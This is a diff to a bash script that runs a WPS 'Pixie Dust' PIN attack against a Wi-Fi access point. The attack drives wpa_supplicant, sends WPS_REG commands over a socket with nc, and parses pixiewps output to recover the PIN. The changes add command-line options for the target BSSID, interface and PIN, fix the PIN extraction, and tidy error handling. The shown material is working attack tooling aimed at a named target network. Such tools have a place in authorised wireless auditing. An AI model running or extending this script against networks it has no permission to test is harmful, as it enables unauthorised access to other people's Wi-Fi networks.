@@ -4,14 +4,19 @@ TEMPDIR=$(mktemp -d)
 TEMPFILE=$(mktemp --suffix=.conf)
 FIFO=$(mktemp -u --suffix=.pipe)
 mkfifo $FIFO
-
-
-BSSID=$1
-PIN=$2
-IFACE=$3
 PIXIE=1
-SOCKET=$TEMPDIR/$IFACE
-echo $SOCKET
+
+
+function usage()
+{
+	echo "Usage: $(basename $0) [options]"
+	echo -e "-i <interface> \tInterface name"
+	echo -e "-b <bssid>     \tTarget BSSID"
+	echo -e "-p <pin>       \tWPS pin to use (optional)"
+	echo -e "-h             \tShow this help"
+	exit
+}
+
 function quit() 
 {
 	rm -rf $TEMPDIR $TEMPFILE $FIFO
@@ -36,7 +41,7 @@ function pixie()
 	then
 		PIN=$(pixiewps -e "$PKE" -r "$PKR" -s "$EHASH1" -z "$EHASH2" -a "$AUTHKEY" -n "$ENONCE" --force |\
 			grep 'WPS pin' |\
-			awk '{print $3}')
+			awk '{print $4}')
 		PIXIE_STATUS=SUCCESS
 	else
 		PIXIE_STATUS=FAIL
@@ -46,7 +51,7 @@ function pixie()
 
 function attack()
 {
-	killall -9 wpa_supplicant
+	killall -9 wpa_supplicant &> /dev/null
 	printI "Launching wpa_supplicant"
 	wpa_supplicant -K -d -D nl80211 -i $IFACE -c $TEMPFILE > $FIFO &
 	#Send WPS_REG command to wpa_supplicant socket
@@ -144,7 +149,7 @@ function attack()
 
 function sendCMD()
 {
-	echo -n "WPS_REG $BSSID $PIN" | nc -u -U "$SOCKET" 
+	echo -n "WPS_REG $BSSID $PIN" | nc -u -U "$SOCKET" || quit 
 	printI "Trying pin: $PIN"
 }
 function gethex()
@@ -164,7 +169,36 @@ function printG()
 	echo "[+] $@"
 }
 
+while getopts "i:b:p:h" opt
+do
+        case $opt in
+                i)
+                        IFACE=${OPTARG};;
+                b)
+                        BSSID=${OPTARG};;
+                p)
+                        PIN=${OPTARG};;
+                h)
+                        usage;;
+                *)
+                        usage;;
+        esac
+done
+
 #Start here
+
+if [ ! "$BSSID" ]\
+|| [ ! "$IFACE" ]
+then
+	usage
+fi
+
+if [ ! "$PIN" ]
+then
+	PIN=12345670
+fi
+
+SOCKET=$TEMPDIR/$IFACE
 #Write wpa_supplicant config to file
 printI "Writing wpa_supplicant config"
 echo -e "ctrl_interface=${TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n" > $TEMPFILE
